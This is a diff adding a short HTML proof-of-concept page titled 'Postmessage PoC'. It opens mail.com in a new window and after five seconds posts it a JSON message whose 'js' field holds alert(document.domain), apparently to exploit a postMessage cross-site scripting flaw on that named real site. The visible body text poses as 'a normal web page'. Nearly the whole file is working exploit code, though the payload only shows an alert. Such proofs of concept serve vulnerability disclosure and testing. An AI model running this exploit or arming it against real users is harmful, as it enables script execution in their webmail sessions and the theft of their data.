@@ -1,0 +1,23 @@
+
+        <!doctype html>
+        <html>
+            <head>
+
+                <meta charset="UTF-8" />
+                <title>Postmessage PoC</title>
+                <script>
+
+                        let win = window.open('https://www.mail.com/');
+                        let msg = "{\n    \"c\": \"js\",\n    \"d\": \"alert(document.domain)//4-\\\\\u003c\u003e'\\\":\"\n}";
+                        msg=JSON.parse(msg);
+                        setTimeout(function(){
+                            win.postMessage(msg, '*');
+                        }, 5000);
+                  
+                </script>
+            </head>
+            <body>
+               <h1>Hi this is a normal web page !!</h1>               
+            </body>
+        </html>
+        
